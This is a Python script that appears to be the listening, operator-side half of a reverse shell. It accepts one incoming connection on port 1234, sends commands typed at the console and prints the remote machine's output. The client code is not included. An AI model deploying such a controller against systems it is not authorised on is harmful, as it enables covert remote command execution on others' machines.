# will be run in the server which has a static IP
import socket
import sys

def create_socket():
    try:
        global serverIP
        global portNo
        global s
        serverIP = ""
        portNo = 1234
        print("Creating socket with machine IP: "+serverIP)
        s = socket.socket()
    except socket.error as err:
        print("Error while creating socket: "+str(err))

def bind_socket():
    try:
        global serverIP
        global portNo
        global s
        print("Binding socket...")
        s.bind((serverIP, portNo))
        s.listen(5)

    except socket.error as err:
        print("Error while binding socket: "+str(err))

def accept_socket():
    global s
    conn, address = s.accept()
    print("Connected to: "+address[0]+":"+str(address[1]))
    run_commands(conn)
    s.close()

def run_commands(conn):
    while True:
        currPath = str(conn.recv(1024), "utf-8")
        print(currPath, end="")
        cmd = input()
        if cmd == "exit":
            conn.close()
            sys.exit()
        elif len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            resp = str(conn.recv(1024), "utf-8")
            if resp == "no-output":
                resp = ""
            print(resp)
        conn.send(str.encode("next"))

def main():
    create_socket()
    bind_socket()
    accept_socket()

main()